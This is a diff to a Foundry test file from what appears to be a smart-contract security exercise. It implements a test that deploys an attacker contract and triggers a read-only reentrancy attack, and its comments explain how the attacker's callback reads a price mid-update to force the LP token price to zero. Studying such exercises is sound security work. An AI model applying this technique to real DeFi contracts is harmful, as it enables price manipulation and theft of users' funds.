@@ -29,9 +29,25 @@ contract ReadOnlyTest is Test {
         assertEq(vulnerable.lpTokenPrice(), 1);
     }
 
-    function test_attack() external {}
+    function test_attack() external {
+        // Deploy attacking contract
+        vm.prank(alice);
+        ReadOnlyAttacker attacker = new ReadOnlyAttacker{value: alice.balance}(
+            pool,
+            vulnerable
+        );
 
-    function _checkSovled() internal {
+        // Start attack The attack will add liquidity, then remove it, which
+        // triggers a callback.  In the callback, before all of the state has
+        // been updated, the attacker can call `snapshotPricee()` which will
+        // generate a 0 price.
+        vm.prank(alice);
+        attacker.attack();
+
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
         // Token price should be zero
         assertEq(vulnerable.lpTokenPrice(), 0);
 
